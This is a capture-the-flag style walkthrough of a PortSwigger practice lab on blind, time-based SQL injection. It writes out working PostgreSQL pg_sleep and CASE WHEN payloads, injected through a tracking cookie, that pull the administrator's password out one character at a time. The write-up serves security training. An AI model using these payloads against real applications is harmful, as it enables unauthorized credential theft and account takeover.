---
Category: SQL-Injection
LAB: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
Difficulty: Practitioner
Featured:
---
---

# Information / Description

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.


---

# Walkthrough

Okay now it is a mix between `Blind SQL Injection` and `Time based SQL Injection`

Now we are going to trigger the blind SQL injection with time delays instead of Booleans

I started with this payload on the known vulnerable field (`TrackingId`):

```
' || pg_sleep(1) -- -
```

To test if we really could do some `SQL Injection` and it indeed took 1 second to answer, now we only need to use this as our Boolean to get our response.

```
' and (select 'a') || pg_sleep(2) -- -
```

I tested this payload to see if I was going the right way but no luck

Then I remembered `case` which essentially is an `if` statement but in databases, let's try something.

```
' (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

This worked, and it's huge because it allows us to get a `select` statement in there and still check if it's working because of the time delay, now we only need to tweak the select.

With some help i cooked up this query:

```
'||(SELECT CASE WHEN SUBSTRING(password,1,1)='4' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

So basically we are doing a subquery with an `if` statement  trying every possible letter or number and we know it's correct when we hit 5 second time out, so what i did is to send it to the intruder to brute force the letter

![](../../../0.%20Assets/Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval-1784581346172.webp)

in this case the first one was 4 and I know it's the correct one because in the intruder, the stream of tries stopped when that number hit the brute force

## Why From users outside of the If statement?


This is because the `FROM users` belongs to the select and the case is something "inside" of it, look at it this way:

```
SELECT
    CASE
        WHEN SUBSTRING(password,1,1)='0'
        THEN pg_sleep(5)
        ELSE pg_sleep(0)
    END
FROM users
WHERE username='administrator';
```


Okay cool so we have the first letter of the password, lets keep going


| `Password` | 4   |
| ---------- | --- |

Ill skip to the end giving the password because it's boring seeing, 2nd character, and a letter or number ..


| `Password` | 4f2fdm0jxx8xcp6s04ojw |
| ---------- | --------------------- |
